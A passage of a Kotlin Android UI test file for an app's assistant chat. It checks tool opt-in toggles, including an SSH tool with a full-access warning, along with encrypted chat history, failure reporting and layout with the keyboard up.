        compose.activityRule.scenario.onActivity { install(it) }
        compose.onNodeWithTag("assistant_tools_entry").performClick()
        val retained = settingsBinding
        for (id in listOf("web_search", "read_page", "inspect_image", "profile_information", "ssh_command")) {
            toolToggle(id).assertIsOff().performClick(); awaitToolSaved(id, true)
            toolToggle(id).assertIsOn().assertIsEnabled()
            compose.runOnIdle { assertEquals(0, calls); settingsFile.failWrites = true }
            toolToggle(id).performClick()
            compose.waitUntil(WAIT_MS) { toolsBinding!!.state.value.let { id in it.failed && id !in it.pending } }
            toolToggle(id).assertIsOn().assertIsEnabled()
            compose.onNode(hasText(localizedText(ru.adsrv.frpjump.R.string.assistant_tool_save_failed)) and hasAnyAncestor(hasTestTag("tool_$id"))).assertExists()
            compose.runOnIdle { assertTrue(committedTool(id)); settingsFile.failWrites = false }
            toolToggle(id).performClick(); awaitToolSaved(id, false)
            toolToggle(id).assertIsOff().assertIsEnabled()
            toolToggle(id).performClick(); awaitToolSaved(id, true)
        }
        compose.activityRule.scenario.recreate()
        compose.activityRule.scenario.onActivity { install(it) }
        for (id in listOf("web_search", "read_page", "inspect_image", "profile_information", "ssh_command")) toolToggle(id).assertIsOn().assertIsEnabled()
        compose.runOnIdle { assertSame(retained, settingsBinding); assertEquals(0, calls) }
    }

    @Test fun sshCommandRequiresOptInAndDisclosesFullAccessAndPrivateOutput() {
        // This test covers tool gating and result handling, not the owner's question (see the confirmation tests below).
        settings.setAssistantConfirmations(ru.adsrv.frpjump.settings.ConfirmationMode.OFF)
        install()
        compose.runOnIdle { mode = "tool-ssh"; assertEquals(0, calls) }
        input().performTextInput("Run synthetic command")
        sendAndAwait()
        compose.runOnIdle { assertEquals(ToolOutcome.UNKNOWN_TOOL, requests.last().turns.last().exchanges.single().results.single().outcome) }
        button("chat_tools").performClick()
        toolToggle("ssh_command").assertIsOff()
        val warning = localizedText(ru.adsrv.frpjump.R.string.tool_ssh_command_hint)
        compose.onNodeWithText(warning).performScrollTo().assertIsDisplayed()
        assertTrue(warning.contains(if (args.getString("chatLocale") == "ru") "ПОЛНЫЙ ДОСТУП" else "FULL SSH ACCESS"))
        toolToggle("ssh_command").performClick(); awaitToolSaved("ssh_command", true)
        compose.runOnIdle { assertEquals(2, calls) }
        compose.onNodeWithTag("tools_back").performScrollTo().performClick()
        input().performTextInput("Try the saved synthetic target")
        sendAndAwait()
        compose.runOnIdle {
            assertEquals(listOf("ssh_command"), requests.last().tools.map { it.name })
            val result = requests.last().turns.last().exchanges.single().results.single()
            assertEquals(ToolOutcome.FAILED, result.outcome)
            assertTrue(result.text.contains("unavailable")); assertTrue(owner!!.state.value.turns.last().toolFailed)
        }
        val targetFailure = hasTestTag("chat_tool_failure_detail") and hasText("SSH target unavailable", substring = true)
        button("chat_history").performScrollToNode(targetFailure)
        compose.onNode(targetFailure).assertIsDisplayed().assertTextContains("SSH target unavailable", substring = true)
    }

    @Test fun profileInformationRequiresExplicitEnabledInvocationAndShowsKnownUnavailableResult() {
        install()
        compose.runOnIdle { mode = "tool-information"; assertEquals(0, calls) }
        input().performTextInput("What does the app know?")
        sendAndAwait()
        compose.runOnIdle {
            assertTrue(requests.first().tools.isEmpty())
            assertEquals(ToolOutcome.UNKNOWN_TOOL, requests.last().turns.last().exchanges.single().results.single().outcome)
        }
        button("chat_history").performScrollToNode(hasText("Profile information is disabled"))
        compose.onNodeWithText("Profile information is disabled").assertIsDisplayed()
        button("chat_tools").performClick()
        toolToggle("profile_information").assertIsOff().performClick(); awaitToolSaved("profile_information", true)
        compose.runOnIdle { assertEquals(2, calls) }
        compose.onNodeWithTag("tools_back").performScrollTo().performClick()
        input().performTextInput("Read profile information")
        sendAndAwait()
        compose.runOnIdle {
            val output = requests.last().turns.last().exchanges.single().results.single()
            assertEquals(ToolOutcome.SUCCESS, output.outcome)
            assertTrue(output.text.contains("synthetic-profile")); assertTrue(output.text.contains("\"available\":false"))
            assertFalse(output.text.contains("never-export-alias"))
            assertFalse(owner!!.state.value.turns.last().toolFailed)
        }
        button("chat_history").performScrollToNode(hasText("App reports an unavailable synthetic profile"))
        compose.onNodeWithText("App reports an unavailable synthetic profile").assertIsDisplayed()
    }

    @Test fun encryptedHistoryRestoresSelectedTargetAndToolReceiptsWithoutReplay() {
        val context = InstrumentationRegistry.getInstrumentation().targetContext
        val id = java.util.UUID.randomUUID().toString()
        val file = java.io.File(context.noBackupFilesDir, "test-chat-$id.json")
        val box = ru.adsrv.frpjump.store.KeystoreSecretBox("frpjump-test-chat-$id")
        val scope = CoroutineScope(SupervisorJob() + Dispatchers.Main.immediate)
        historyCleanup = { scope.cancel(); file.delete(); box.destroy() }
        history = AssistantChatHistory(ru.adsrv.frpjump.store.AtomicTextFile(file), box, scope)
        informationFixture = ProfileInformationFixture(); information = informationFixture!!.information
        mode = "profile-results"; settings.update { it.copy(assistantProfileInformation = true) }
        install()
        compose.waitUntil(WAIT_MS) { owner?.state?.value?.loading == false }
        input().performTextInput("Найди подключения к board1500")
        sendAndAwait()
        runBlocking(Dispatchers.IO) { history!!.load() }
        val ciphertext = file.readText()
        assertFalse(ciphertext.contains("board1500")); assertFalse(ciphertext.contains("work-root"))
        val before = calls
        button("chat_back").performClick()
        runBlocking(Dispatchers.IO) { history!!.load() }
        compose.runOnIdle {
            history = AssistantChatHistory(ru.adsrv.frpjump.store.AtomicTextFile(file),
                ru.adsrv.frpjump.store.KeystoreSecretBox("frpjump-test-chat-$id"), scope)
            mode = "resume-history"
        }
        compose.onNodeWithTag("assistant_chat_entry").performClick()
        compose.waitUntil(WAIT_MS) { owner?.state?.value?.let { !it.loading && it.turns.size == 1 } == true }
        compose.runOnIdle {
            assertEquals(before, calls)
            assertTrue(owner!!.state.value.turns.single().answer.contains("Work · board1500"))
            assertEquals("profile_information", owner!!.state.value.turns.single().receipts.single().call.name)
        }
        button("chat_history").performScrollToNode(hasTestTag("chat_tool_receipts"))
        compose.onNodeWithTag("chat_tool_receipts").performClick()
        button("chat_history").performScrollToNode(hasText("work-root", substring = true))
        compose.onNode(hasText("work-root", substring = true) and hasText("profile_information", substring = true)).assertIsDisplayed()
        input().performTextInput("Продолжай с рабочим root-подключением")
        sendAndAwait()
        compose.runOnIdle {
            assertEquals(before + 1, calls)
            assertEquals("Continued work / work-root", owner!!.state.value.turns.last().answer)
            assertTrue(requests.last().turns.last().exchanges.isEmpty())
        }
    }

    @Test fun profileSearchShowsAllVariantsAndRetainsSelectedFactsAfterProviderFailure() {
        informationFixture = ProfileInformationFixture()
        information = informationFixture!!.information
        mode = "profile-results"
        settings.update { it.copy(assistantProfileInformation = true) }
        install(); input().performTextInput("Найди подключения к board1500")
        sendAndAwait()
        compose.runOnIdle {
            val turn = owner!!.state.value.turns.single()
            assertTrue(turn.answer.contains("Work · board1500 · Service root · SSH:22 · root"))
            assertTrue(turn.answer.contains("Work · board1500 · Service admin · SSH:22 · admin"))
            assertTrue(turn.answer.contains("Home · board1500 · Service root · SSH:22 · root"))
            assertEquals(1, turn.information.size); assertTrue(owner!!.state.value.information.isEmpty())
            mode = "profile-results-provider-fail"; informationFixture!!.fail = true
        }
        input().performTextInput("Проверь ещё раз board1500")
        sendAndAwait()
        compose.runOnIdle {
            assertEquals(ChatProblem.PROVIDER, owner!!.state.value.problem)
            val selected = owner!!.state.value.information.single()
            assertSame(requests.last().turns.last().exchanges.single().results.single(), selected.result)
            assertEquals(JsonPrimitive(false), selected.page!!["source_status"]!!.jsonObject["complete"])
            assertFalse(selected.result.text.contains("synthetic-private-error"))
        }
        for (identity in listOf("work / work-root", "work / work-admin", "home / home-root")) {
            val match = hasText(identity) and hasAnyAncestor(hasTestTag("chat_profile_information_facts"))
            button("chat_history").performScrollToNode(match)
            compose.onNode(match).performScrollTo().assertIsDisplayed()
        }
        button("chat_history").performScrollToNode(hasText(localizedText(ru.adsrv.frpjump.R.string.profile_information_partial)))
        compose.onNodeWithText(localizedText(ru.adsrv.frpjump.R.string.profile_information_partial)).performScrollTo().assertIsDisplayed()
    }

    @Test fun toolsFlowShowsFetchedSourcesAndFailureWithoutMakingMarkdownActive() {
        mode = "tool-read"
        settings.update { it.copy(assistantReadPage = true) }
        settings.assistantChat.publicWeb = PublicFetcher { url, _, attempt ->
            ru.adsrv.frpjump.agent.admitSideEffect("public-dispatch"); attempt("public-dispatch")
            if (!url.startsWith("https://")) throw WebException(WebFailure.URL)
            WebResponse("https://public.org/doc", "text/html", "<title>Fetched guide</title><p>Useful static documentation with enough text to read.</p>".toByteArray(), 200, null)
        }
        install(); input().performTextInput("Read documentation")
        sendAndAwait()
        button("chat_history").performScrollToNode(hasText("Fetched guide\nhttps://public.org/doc"))
        compose.onNodeWithText("Fetched guide\nhttps://public.org/doc").assertIsDisplayed().assertHasNoClickAction()
        compose.runOnIdle { assertEquals(2, calls); assertEquals(1, owner!!.state.value.turns.single().sources.size); mode = "tool-failure" }
        input().performTextInput("Unavailable page")
        sendAndAwait()
        compose.runOnIdle { assertTrue(owner!!.state.value.turns.last().toolFailed); assertTrue(owner!!.state.value.turns.last().sources.isEmpty()); mode = "tool-read-provider-fail" }
        input().performTextInput("Fetch then fail")
        sendAndAwait()
        compose.runOnIdle { assertEquals(ChatProblem.PROVIDER, owner!!.state.value.problem); assertEquals(1, owner!!.state.value.currentSources.size) }
        button("chat_history").performScrollToIndex(2)
        assertTrue(compose.onAllNodes(hasTestTag("chat_sources") and hasAnyAncestor(hasTestTag("chat_history"))).fetchSemanticsNodes().isNotEmpty())
        input().assertIsDisplayed()
        compose.runOnIdle { mode = "tool-failure-provider-fail" }
        input().performTextReplacement("Fail again")
        sendAndAwait()
        compose.runOnIdle {
            assertTrue(owner!!.state.value.turns.last().toolFailed)
            assertTrue(owner!!.state.value.toolFailed)
            assertEquals(ChatProblem.PROVIDER, owner!!.state.value.problem)
        }
        button("chat_history").performScrollToNode(hasTestTag("chat_current_tool_failure"))
        button("chat_current_tool_failure").assertIsDisplayed()
        compose.onNode(hasTestTag("chat_tool_failure_detail") and hasAnyAncestor(hasTestTag("chat_current_tool_failure"))).assertIsDisplayed().assertTextContains("Address refused", substring = true)
    }

    @Test fun historyStaysReadableAndScrollableWithTheKeyboardUp() {
        mode = "tool-failure"
        settings.update { it.copy(assistantReadPage = true) }
        settings.assistantChat.publicWeb = PublicFetcher { url, _, attempt ->
            ru.adsrv.frpjump.agent.admitSideEffect("public-dispatch"); attempt("public-dispatch")
            if (!url.startsWith("https://")) throw WebException(WebFailure.URL)
            WebResponse(url, "text/html", "x".toByteArray(), 200, null)
        }
        install(); input().performTextInput("Unavailable page")
        sendAndAwait()
        compose.runOnIdle { assertTrue(owner!!.state.value.turns.last().toolFailed); mode = "tool-failure-provider-fail" }
        // A second message with the soft keyboard really up (the first turn's failure is already in the history).
        input().performTextInput("Fail again")
        sendAndAwait()
        compose.runOnIdle { assertEquals(ChatProblem.PROVIDER, owner!!.state.value.problem) }
        compose.activityRule.scenario.onActivity { activity ->
            androidx.core.view.WindowCompat.getInsetsController(activity.window, activity.window.decorView).show(androidx.core.view.WindowInsetsCompat.Type.ime())
        }
        val until = SystemClock.uptimeMillis() + 5000
        fun keyboardUp(): Boolean { var up = false; compose.activityRule.scenario.onActivity { up = androidx.core.view.ViewCompat.getRootWindowInsets(it.window.decorView)?.isVisible(androidx.core.view.WindowInsetsCompat.Type.ime()) == true }; return up }
        while (!keyboardUp() && SystemClock.uptimeMillis() < until) SystemClock.sleep(100)
        assertTrue("the soft keyboard did not come up", keyboardUp())
        settle("chat_send"); compose.waitForIdle()
        // Compact (landscape) scrolls as a whole, so the error needs scrolling to there; in portrait it is on screen as it is.
        if (args.getString("composerOrientation") == "landscape") compose.onNodeWithTag("chat_error").performScrollTo()
        compose.onNodeWithTag("chat_error").assertIsDisplayed()
        shot("history-keyboard")
        // The history is at least three lines of body text high (measured from the real failure text, so it follows the font scale), the
        // field and Send keep their room below it, and the failure of the turn is reachable by scrolling.
        button("chat_history").performScrollToNode(hasTestTag("chat_current_tool_failure"))
        val line = mutableListOf<androidx.compose.ui.text.TextLayoutResult>().also { out ->
            val detail = compose.onNode(hasTestTag("chat_tool_failure_detail") and hasAnyAncestor(hasTestTag("chat_current_tool_failure")), useUnmergedTree = true).fetchSemanticsNode()
            compose.runOnIdle { detail.config[androidx.compose.ui.semantics.SemanticsActions.GetTextLayoutResult].action!!.invoke(out) }
        }.first().let { it.getLineBottom(0) - it.getLineTop(0) }
        val minimum = 3 * line
        val history = bounds("chat_history")
        assertTrue("history is ${history.height} px high, expected at least $minimum (3 lines of $line)", history.height >= minimum)
        // Landscape is the compact layout: the whole screen scrolls, so "in the window" and "below" are not promises there.
        if (args.getString("composerOrientation") != "landscape") {
            assertTrue("the field overlaps the history", bounds("chat_input").top >= history.bottom - 1f)
            assertTrue("Send is below the field", bounds("chat_send").top >= bounds("chat_input").bottom - 1f)
            assertTrue("Send is outside the window", bounds("chat_send").bottom <= rootBounds().bottom + 1f)
        }
        // The error under the history: its region ends on a line boundary (never a half line) and, when it cannot show all of the error, says
        // so with the scroll mark; the rest is reachable by scrolling.
        // (Landscape has no cap: the notices show in full inside the scrolling screen, which the scroll-to above already proved.)
        if (args.getString("composerOrientation") != "landscape") {
            val errorLine = layoutOf("chat_error").let { it.getLineBottom(0) - it.getLineTop(0) }
            val errorLines = layoutOf("chat_error").lineCount
            val region = bounds("chat_notices_below").height
            val shownLines = region / errorLine
            assertTrue("the notice region ($region px) ends mid-line (line $errorLine px)", Math.abs(shownLines - Math.round(shownLines)) < 0.02f && shownLines >= 1f)
            val cut = Math.round(shownLines) < errorLines
            assertEquals("the scroll mark must show exactly when the error is cut", cut, compose.onAllNodes(hasTestTag("chat_notices_below_more"), useUnmergedTree = true).fetchSemanticsNodes().isNotEmpty())
            if (cut) {
                compose.onNodeWithTag("chat_notices_below", useUnmergedTree = true).performSemanticsAction(androidx.compose.ui.semantics.SemanticsActions.ScrollBy) { it(0f, 100_000f) }
                compose.waitForIdle()
                val tail = bounds("chat_error")
                assertTrue("the end of the error is not reachable", tail.bottom <= bounds("chat_notices_below").bottom + 1f)
                assertEquals("the mark must go once scrolled to the end", 0, compose.onAllNodes(hasTestTag("chat_notices_below_more"), useUnmergedTree = true).fetchSemanticsNodes().size)
            }
        }
        button("chat_history").performScrollToIndex(0)
        compose.onNodeWithText("Unavailable page", substring = true).assertIsDisplayed()
        button("chat_history").performScrollToNode(hasTestTag("chat_current_tool_failure"))
        button("chat_current_tool_failure").assertIsDisplayed()
        compose.onNode(hasTestTag("chat_tool_failure_detail") and hasAnyAncestor(hasTestTag("chat_current_tool_failure"))).assertIsDisplayed().assertTextContains("Address refused", substring = true)
    }

    @Test fun toolFailureReasonSurvivesProviderFailureWithoutModelExplanation() {
        mode = "search-failure-provider-fail"
        settings.update { it.copy(assistantSearch = true) }
        settings.assistantChat.publicWeb = PublicFetcher { url, _, attempt ->
            ru.adsrv.frpjump.agent.admitSideEffect("public-dispatch"); attempt("public-dispatch")
            WebResponse(url, "text/html", "<form id='challenge-form'></form>".toByteArray(), 202, null)
        }
        install(); input().performTextInput("Find the documentation")
        sendAndAwait()
        compose.runOnIdle {
            assertEquals(ChatProblem.PROVIDER, owner!!.state.value.problem)
            assertTrue(owner!!.state.value.toolFailed)
            assertTrue(owner!!.state.value.turns.isEmpty())
        }
        button("chat_history").performScrollToNode(hasText("HTTP 202", substring = true))
        compose.onNodeWithText("HTTP 202", substring = true).assertIsDisplayed()
        button("chat_history").performScrollToNode(hasText("synthetic generated documentation query", substring = true))
        compose.onNodeWithText("synthetic generated documentation query", substring = true).assertIsDisplayed()
    }

    @Test fun actualAndroidImageBoundsAndOptimisticObservationReleasePixelsAndFailTruthfully() = runBlocking {
        val bitmap = android.graphics.Bitmap.createBitmap(2, 2, android.graphics.Bitmap.Config.ARGB_8888)
        val bytes = java.io.ByteArrayOutputStream().also { bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, it) }.toByteArray()
        bitmap.recycle()
        validateImage("image/png", bytes)
        assertThrows(WebException::class.java) { validateImage("image/jpeg", bytes) }
        assertThrows(WebException::class.java) { validateImage("image/png", byteArrayOf(1, 2, 3)) }
        val inspected = mutableListOf<String>()
        val inspector = object : ru.adsrv.frpjump.agent.ImageInspector {
            override suspend fun inspectImage(mime: String, bytes: ByteArray, question: String): String {
                inspected += question; return "I cannot process images"
            }
        }
        val session = AssistantWebTools(ru.adsrv.frpjump.settings.AssistantTools(inspectImage = true), PublicFetcher { _, _, attempt ->
            ru.adsrv.frpjump.agent.admitSideEffect("public-dispatch"); attempt("public-dispatch"); WebResponse("https://public.org/image.png", "image/png", bytes, 200, null)
        }, WebSearchState(), inspector, {})
        val arguments = kotlinx.serialization.json.buildJsonObject { put("url", kotlinx.serialization.json.JsonPrimitive("https://public.org/image.png")); put("question", kotlinx.serialization.json.JsonPrimitive("What is shown?")) }
        val admitted = mutableListOf<String>()
        withContext(ru.adsrv.frpjump.agent.SideEffectAdmission { admitted += it; true }) { session.tools.single().execute(arguments) }.also {
            assertEquals(listOf("tool-start", "public-dispatch", "image-dispatch"), admitted)
            assertEquals(ToolOutcome.SUCCESS, it.outcome)
            assertTrue(it.text.contains("I cannot process images")); assertTrue(it.text.contains("unverified"))
            assertFalse(it.text.contains("model-declared"))
        }
        assertEquals(ToolOutcome.SUCCESS, session.tools.single().execute(arguments).outcome)
        assertEquals(ToolOutcome.FAILED, session.tools.single().execute(arguments).outcome)
        assertEquals(2, inspected.size); assertEquals(1, session.sources.size)
        val large = android.graphics.Bitmap.createBitmap(2001, 2000, android.graphics.Bitmap.Config.ARGB_8888)
        val bomb = java.io.ByteArrayOutputStream().also { large.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, it) }.toByteArray()
        large.recycle()
        assertThrows(WebException::class.java) { validateImage("image/png", bomb) }
        val rejecting = object : ru.adsrv.frpjump.agent.ImageInspector {
            override suspend fun inspectImage(mime: String, bytes: ByteArray, question: String): String {
                throw ru.adsrv.frpjump.agent.openai.OpenAiProviderException(ru.adsrv.frpjump.agent.openai.ProviderFailure.HTTP, 400)
            }
        }
        val rejected = AssistantWebTools(ru.adsrv.frpjump.settings.AssistantTools(inspectImage = true), PublicFetcher { _, _, attempt ->
            ru.adsrv.frpjump.agent.admitSideEffect("public-dispatch"); attempt("public-dispatch"); WebResponse("https://public.org/image.png", "image/png", bytes, 200, null)
        }, WebSearchState(), rejecting, {})
        var normalCalls = 0
        val result = AgentModule(true).run(AgentProvider { request ->
            if (++normalCalls == 1) AgentReply(calls = listOf(ToolCall("visual", "inspect_image", arguments)))
            else {
                assertEquals(ToolOutcome.FAILED, request.turns.last().exchanges.single().results.single().outcome)
                assertTrue(request.turns.last().exchanges.single().results.single().text.contains("HTTP 400"))
                AgentReply("Image inspection failed; I can continue using text")
            }
        }, rejected.tools, "Only use enabled tools", "Inspect selected image")
        assertEquals(AgentFinish.COMPLETE, result.finish); assertEquals(2, normalCalls); assertTrue(rejected.sources.isEmpty())
    }

    @Test fun chatToolsAllSwitchesKeepCurrentSnapshotCompleteAndApplyNextSend() {
        install(); input().performTextInput("Completed first")
        sendAndAwait()
        val retained = owner!!
        val ids = listOf("web_search", "read_page", "inspect_image", "profile_information", "ssh_command")
        for ((index, id) in ids.withIndex()) {
            val completeCount = retained.state.value.turns.size
            compose.runOnIdle { heldProviderReply = CompletableDeferred(); mode = "held-answer" }
            input().performTextInput("pending-$id"); button("chat_send").performClick()
            compose.waitUntil(WAIT_MS) { retained.state.value.busy }
            compose.runOnIdle { assertEquals(ids.take(index), requests.last().tools.map { it.name }) }
            button("chat_tools").performClick()
            compose.runOnIdle { settingsFile.failWrites = true }
            toolToggle(id).assertIsOff().performClick()
            compose.waitUntil(WAIT_MS) { toolsBinding!!.state.value.let { id in it.failed && id !in it.pending } }
            toolToggle(id).assertIsOff().assertIsEnabled()
            compose.onNode(hasText(localizedText(ru.adsrv.frpjump.R.string.assistant_tool_save_failed)) and hasAnyAncestor(hasTestTag("tool_$id"))).assertExists()
            compose.runOnIdle { assertFalse(committedTool(id)); assertTrue(retained.state.value.busy); settingsFile.failWrites = false }
            // Explicit retry after a proven storage failure, never a repeat of an unacknowledged touch.
            toolToggle(id).performClick(); awaitToolSaved(id, true)
            toolToggle(id).assertIsOn().assertIsEnabled()
            compose.runOnIdle {
                assertTrue(committedTool(id)); assertTrue(retained.state.value.busy)
                assertEquals(completeCount, retained.state.value.turns.size)
                assertEquals("pending-$id", retained.state.value.draft)
            }
            if (index % 2 == 0) compose.onNodeWithTag("tools_back").performScrollTo().performClick()
            else compose.runOnIdle { compose.activity.onBackPressedDispatcher.onBackPressed() }
            compose.runOnIdle { assertSame(retained, owner) }
            input().assertTextContains("pending-$id")
            compose.runOnIdle { heldProviderReply.complete(Unit) }
            awaitIdle()
            compose.runOnIdle {
                assertEquals(completeCount + 1, retained.state.value.turns.size)
                assertEquals("late reply", retained.state.value.turns.last().answer)
                assertEquals("", retained.state.value.draft); mode = "answer"
            }
            input().performTextInput("next-$id"); sendAndAwait()
            compose.runOnIdle {
                assertEquals(completeCount + 2, retained.state.value.turns.size)
                assertEquals(ids.take(index + 1), requests.last().tools.map { it.name })
                assertEquals(completeCount + 2, requests.last().turns.size)
            }
        }
        for ((index, id) in ids.withIndex()) {
            val count = retained.state.value.turns.size
            compose.runOnIdle { heldProviderReply = CompletableDeferred(); mode = "held-answer" }
            input().performTextInput("pending-off-$id"); button("chat_send").performClick()
            compose.waitUntil(WAIT_MS) { retained.state.value.busy }
            button("chat_tools").performClick()
            toolToggle(id).assertIsOn().performClick(); awaitToolSaved(id, false)
            toolToggle(id).assertIsOff().assertIsEnabled()
            compose.runOnIdle { assertFalse(committedTool(id)); assertTrue(retained.state.value.busy); assertEquals(count, retained.state.value.turns.size) }
            if (index % 2 == 0) compose.runOnIdle { compose.activity.onBackPressedDispatcher.onBackPressed() }
            else compose.onNodeWithTag("tools_back").performScrollTo().performClick()
            input().assertTextContains("pending-off-$id")
            compose.runOnIdle { heldProviderReply.complete(Unit) }; awaitIdle()
            compose.runOnIdle { assertSame(retained, owner); assertEquals(count + 1, retained.state.value.turns.size); assertEquals("", retained.state.value.draft); mode = "answer" }
            input().performTextInput("next-off-$id"); sendAndAwait()
            compose.runOnIdle { assertEquals(ids.drop(index + 1), requests.last().tools.map { it.name }); assertEquals(count + 2, requests.last().turns.size) }
        }
        input().performTextInput("Retained draft")
        button("chat_tools").performClick()
        for (id in ids) toolToggle(id).assertIsOff().assertIsEnabled()
        compose.activityRule.scenario.recreate()
        compose.activityRule.scenario.onActivity { install(it) }
        toolToggle("web_search").assertIsOff().assertIsEnabled()
        compose.runOnIdle { compose.activity.onBackPressedDispatcher.onBackPressed() }
        compose.runOnIdle { assertSame(retained, owner); assertEquals(1 + 4 * ids.size, retained.state.value.turns.size) }
        input().assertTextContains("Retained draft")
        button("chat_back").performClick()
        compose.waitUntil(WAIT_MS) { retained.state.value == ChatState() }
        compose.onNodeWithTag("assistant_chat_entry").performClick()
        compose.runOnIdle { assertNotSame(retained, owner); assertTrue(owner!!.state.value.turns.isEmpty()) }
    }

    @Test fun oldAndCurrentExchangeOmissionsUseTruthfulLocalizedContextLabel() {
        mode = "current-omission"; install()
        input().performTextInput("Current exchanges"); sendAndAwait()
        compose.runOnIdle { assertEquals(1, owner!!.state.value.turns.size); assertTrue(owner!!.state.value.omitted) }
        compose.onNodeWithText(localizedText(ru.adsrv.frpjump.R.string.chat_omitted)).assertExists()
        button("chat_back").performClick()
        compose.onNodeWithTag("assistant_chat_entry").performClick()
        compose.runOnIdle { mode = "long-context" }
        input().performTextInput("First old turn"); sendAndAwait()
        compose.runOnIdle { assertFalse(owner!!.state.value.omitted); owner!!.edit("y".repeat(7000)) }
        sendAndAwait()
        compose.runOnIdle { assertTrue(owner!!.state.value.omitted); assertEquals(2, owner!!.state.value.turns.size) }
        compose.onNodeWithText(localizedText(ru.adsrv.frpjump.R.string.chat_omitted)).assertExists()
    }

    @Test fun bothToolsBindingsKeepPendingAcrossBackRecreationAndCancelPublicationOnActualPop() {
        compose.activityRule.scenario.onActivity { install(it) }
        for ((index, id) in listOf("read_page", "inspect_image").withIndex()) {
            if (index == 0) compose.onNodeWithTag("assistant_tools_entry").performClick()
            else {
                compose.onNodeWithTag("assistant_chat_entry").performClick()
                input().performTextInput("Retained draft")
                button("chat_tools").performClick()
            }
            val binding = compose.runOnIdle { checkNotNull(toolsBinding) }
            val entered = java.util.concurrent.CountDownLatch(1); val release = java.util.concurrent.CountDownLatch(1)
            settingsFile.beforeWrite = { entered.countDown(); check(release.await(20, java.util.concurrent.TimeUnit.SECONDS)) }
            try {
                toolToggle(id).assertIsOff().performClick()
                assertTrue(entered.await(2, java.util.concurrent.TimeUnit.SECONDS))
                toolToggle(id).assertIsOff().assertIsNotEnabled()
                compose.runOnIdle { assertEquals(setOf(id), binding.state.value.pending); assertFalse(committedTool(id)) }
                compose.onNodeWithTag("tools_back").performScrollTo().performClick()
                if (index == 0) compose.onNodeWithTag("assistant_tools_entry").performClick()
                else { input().assertTextContains("Retained draft"); button("chat_tools").performClick() }
                toolToggle(id).assertIsOff().assertIsNotEnabled()
                compose.activityRule.scenario.recreate()
                compose.activityRule.scenario.onActivity { install(it) }
                toolToggle(id).assertIsOff().assertIsNotEnabled()
                compose.runOnIdle { assertSame(binding, toolsBinding); assertTrue(id in binding.state.value.pending) }
                settingsFile.beforeWrite = null; release.countDown()
                awaitToolSaved(id, true); toolToggle(id).assertIsOn().assertIsEnabled()
                compose.onNodeWithTag("tools_back").performScrollTo().performClick()
            } finally { settingsFile.beforeWrite = null; release.countDown() }
        }
        // Actual Chat pop cancels this binding. Blocking IO may still commit; no rollback claim.
        button("chat_tools").performClick()
        val oldBinding = toolsBinding!!; val oldChat = owner!!
        val entered = java.util.concurrent.CountDownLatch(1); val release = java.util.concurrent.CountDownLatch(1)
        settingsFile.beforeWrite = { entered.countDown(); check(release.await(20, java.util.concurrent.TimeUnit.SECONDS)) }
        try {
            toolToggle("web_search").assertIsOff().performClick()
            assertTrue(entered.await(2, java.util.concurrent.TimeUnit.SECONDS))
            toolToggle("web_search").assertIsOff().assertIsNotEnabled()
            val oldState = oldBinding.state.value
            compose.onNodeWithTag("tools_back").performScrollTo().performClick()
            input().assertTextContains("Retained draft")
            button("chat_back").performClick()
            compose.waitUntil(WAIT_MS) { oldChat.state.value == ChatState() }
            compose.onNodeWithTag("assistant_chat_entry").performClick()
            compose.runOnIdle { assertNotSame(oldChat, owner); assertNotSame(oldBinding, chatBinding) }
            settingsFile.beforeWrite = null; release.countDown()
            button("chat_tools").performClick(); awaitToolSaved("web_search", true)
            toolToggle("web_search").assertIsOn().assertIsEnabled()
            compose.runOnIdle { assertEquals(oldState, oldBinding.state.value); assertTrue(oldBinding.state.value.failed.isEmpty()); assertEquals(0, calls) }
        } finally { settingsFile.beforeWrite = null; release.countDown() }
    }


    // ---- Confirmation of changing calls (chat-component runner: a plain Application, the production ViewModel and screen) ----

    /** Saved from the Compose tree itself (no UiAutomation, which would stay connected and disturb later tests); a dialog has its own window. */
    private fun shot(name: String, dialog: Boolean = false) {
        val tag = listOf(args.getString("chatLocale") ?: "en", args.getString("composerOrientation") ?: "portrait", "font" + (args.getString("composerFontScale") ?: "1.0")).joinToString("-")
        val target = java.io.File(compose.activity.getExternalFilesDir(null), "f8-$name-$tag.png")
        val image = (if (dialog) compose.onNode(isDialog()) else compose.onAllNodes(isRoot())[0]).captureToImage().asAndroidBitmap()
        target.outputStream().use { image.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, it) }
    }
    private fun startConfirmation(providerMode: String = "tool-ssh") {
        settings.setAssistantTool(AssistantToolId.SSH_COMMAND, true)
        install()
        compose.runOnIdle { mode = providerMode }
        input().performTextInput("Run synthetic command")
        button("chat_send").performClick()
        try { compose.waitUntil(WAIT_MS) { owner?.state?.value?.confirmation != null } }
        catch (e: androidx.compose.ui.test.ComposeTimeoutException) { throw AssertionError("no question appeared: " + diagnose("no-question"), e) }
        compose.waitForIdle()
    }
    /** What the screen looked like when a wait gave up: state, the key nodes' bounds and a screenshot. */
    private fun diagnose(name: String): String {
        runCatching { shot(name) }
        val s = owner?.state?.value
        fun b(tag: String) = runCatching { bounds(tag).toString() }.getOrDefault("none")
        return "busy=${s?.busy} stopping=${s?.stopping} draft='${s?.draft}' pending=${s?.pendingText} problem=${s?.problem} requests=${requests.size} " +
            "root=${runCatching { rootBounds() }.getOrNull()} send=${b("chat_send")} stop=${b("chat_stop")} input=${b("chat_input")} title=${b("chat_title")} mark=${b("chat_confirmations_off")}"
    }
    private fun landscape() = compose.activity.resources.configuration.orientation == Configuration.ORIENTATION_LANDSCAPE
    /** The node is displayed; in the compact landscape layout the screen column is scrolled to it first. */
    private fun shown(tag: String): SemanticsNodeInteraction {
        val node = compose.onNodeWithTag(tag)
        if (landscape()) node.performScrollTo()
        else try { node.assertIsDisplayed() } catch (_: AssertionError) { node.performScrollTo() }  // a card taller than the screen scrolls as a whole
        return node.assertIsDisplayed()
    }
    private fun bounds(tag: String) = compose.onNodeWithTag(tag, useUnmergedTree = true).fetchSemanticsNode().boundsInRoot
    private fun rootBounds() = compose.onAllNodes(isRoot())[0].fetchSemanticsNode().boundsInRoot
    /** The text layout of a Text node (its lines, ellipsis and the horizontal position of any character). */
    private fun layoutOf(tag: String): androidx.compose.ui.text.TextLayoutResult {
        val node = compose.onNodeWithTag(tag, useUnmergedTree = true).fetchSemanticsNode()
        val out = mutableListOf<androidx.compose.ui.text.TextLayoutResult>()
        compose.runOnIdle { node.config[androidx.compose.ui.semantics.SemanticsActions.GetTextLayoutResult].action!!.invoke(out) }
        return out.first()
    }
